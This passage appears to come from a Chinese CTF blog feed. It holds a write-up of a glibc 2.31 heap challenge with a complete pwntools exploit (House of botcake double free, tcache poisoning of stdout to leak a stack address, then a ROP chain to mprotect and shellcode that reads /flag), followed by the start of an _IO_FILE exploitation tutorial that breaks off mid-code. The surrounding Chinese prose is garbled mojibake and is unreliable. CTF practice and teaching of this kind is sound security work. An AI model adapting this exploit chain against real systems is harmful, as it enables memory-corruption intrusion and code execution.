class="header-anchor" href="#blue">Â¶</a>blue</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194659319.png" alt="image-20220619194659319"></p><p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p><p>Ubuntu GLIBC 2.31-0ubuntu9.8 çš„å †é¢˜ï¼ŒIO jumps æ®µä¸å¯å†™ï¼Œæ²¡æœ‰åŠæ³•æŒ‰ä¼ ç»Ÿæ€è·¯èµ°ã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨åé—¨å‡½æ•°ï¼Œç±»ä¼¼ House of botcake çš„æ‰‹æ³•å®Œæˆå †å—é‡å çš„åŒæ—¶ leak å‡º libcã€‚</li><li>æ”»å‡» Stdout Leak æ ˆåœ°å€</li><li>å¡ ROP</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x80</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Please input content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bkdoor</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">666</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] House of botcake</span><br><span class="hljs-string">[*] Double Free --&gt; Modify chunk&#x27;s size --&gt; Chunk Overlapping</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>bkdoor(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc.address = libc_base<br>stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>stack_addr = libc.sym.environ<br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br>rdi = libc_base +<span class="hljs-number">0x0000000000023b6a</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000010d5dd</span><br><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0x90</span>*<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment"># 4</span><br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poisoning --&gt; Hijack Stdout --&gt; leak environ addr</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stdout)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(stack_addr)+p64(stack_addr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment"># 6</span><br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poinsoning --&gt; Hijack Stack --&gt; ROP --&gt; Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">5</span>)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stack_addr-<span class="hljs-number">0x120</span>)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[~] Gets to input more data (Optional)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = flat([<br>    rdi,stack_addr-<span class="hljs-number">0x108</span>,libc.sym.gets<br>])<br>add(<span class="hljs-number">0x80</span>,payload) <span class="hljs-comment"># 7</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Enable Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>mmp = flat([<br>    rdi,((stack_addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,stack_addr,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,libc.sym.read,jmp_rsi<br>])<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(mmp)<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>_IO_FILE è‰ºæœ¯é‰´èµ</title>
    <link href="/posts/13285c73.html"/>
    <url>/posts/13285c73.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>é¡ºé£çå‡ æŠŠ ğŸ‘ ï¼Œç»å¢ƒ IOFILEã€‚</p><footer><strong>ã€Š :sheep: ä¸é :sheep: ã€‹</strong></footer></blockquote><p>ğŸ‘´ å¤ªå–œæ¬¢è¿™ä¸ª IO ç©æ„äº†ï¼Œæ— æ•Œå¸…ã€‚ğŸ‘´ å•æ–¹é¢å®£å¸ƒ <strong>IO</strong> æ˜¯ glibc å”¯ä¸€çœŸç¥ã€‚</p><p>æ„Ÿè°¢ <strong>é£æ²äº‘çƒŸ</strong> å¸ˆå‚…æ•™æˆ‘çš„ IO ä¸€æ•´æ¡åˆ©ç”¨è·¯çº¿å’Œè€å¿ƒè§£ç­”ï¼Œ<strong>é£æ²æ²</strong> æˆ‘æ»´è¶…äººã€‚</p><h1>åŸºç¡€çŸ¥è¯†å­¦ä¹ </h1><h2 id="IO-FILEä¸»è¦ç»“æ„"><a class="header-anchor" href="#IO-FILEä¸»è¦ç»“æ„">Â¶</a>_IO_FILEä¸»è¦ç»“æ„</h2><h3 id="IO-FILE-plus"><a class="header-anchor" href="#IO-FILE-plus">Â¶</a>_IO_FILE_plus</h3><p>é¦–å…ˆæ˜¯_IO_FILE_plusï¼Œæ¯ä¸ª _IO_FILE ç»“æ„ä½“éƒ½è¢«åŒ…å«åœ¨ä¸€ä¸ª _IO_FILE_plus ç»“æ„ä½“ä¹‹ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><span class="hljs-comment">//è™šå‡½æ•°è¡¨</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ vtable æ˜¯æŒ‡å‘ä¸€ç³»åˆ—å‡½æ•°çš„ä¸€å¼ è¡¨ï¼Œ _IO_jump_t ç»“æ„ä½“ç»“æ„å¦‚ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br></code></pre></td></tr></table></figure><h3 id="FILE"><a class="header-anchor" href="#FILE">Â¶</a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œé€šè¿‡ gdb æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„æŸ¥çœ‹æŸä¸ª FILE ç»“æ„ä½“å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stderr_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad2087</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffff7dce704</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7ffff7dce760</span>,<br>    _fileno = <span class="hljs-number">0x2</span>,<br>    _flags2 = <span class="hljs-number">0x0</span>,<br>    _old_offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _cur_column = <span class="hljs-number">0x0</span>,<br>    _vtable_offset = <span class="hljs-number">0x0</span>,<br>    _shortbuf = &#123;<span class="hljs-number">0x0</span>&#125;,<br>    _lock = <span class="hljs-number">0x7ffff7dcf8b0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffff7dcd780</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0x0</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffff7dca2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>_flags</strong> è¿™ä¸ªä½ç½®å…¶å®æ¯”è¾ƒå…³é”®ï¼Œåé¢æˆ‘ä»¬è¦å¼„æ¸…æ¥šæ€ä¹ˆè®¾ç½®çš„æ‰èƒ½è¿›å…¥æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ï¼Œå®Œæˆç›¸å…³åˆ©ç”¨ã€‚å½“ç„¶ä¼ªé€ çš„æ—¶å€™æˆ‘ä»¬éƒ½æ˜¯æ ¹æ®å…·ä½“å‡½æ•°æ¥ç²¾å¿ƒæ„é€ çš„ï¼Œä½†ç‰¹åˆ«å¥½ç”¨çš„æœ‰ä¿©ï¼š<code>0</code> å’Œ <code>0xfbad1800</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="hljs-comment">/* Emulate old stdio. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS 4 <span class="hljs-comment">/* Reading not allowed */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED 0x80 <span class="hljs-comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF 0x2000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_BAD_SEEN 0x4000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK 0x8000</span><br></code></pre></td></tr></table></figure><p><strong>ray-cp</strong> å¸ˆå‚…è„šæœ¬é‡Œå·çš„ç»“æ„ä½“çš„å„ç§åç§»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 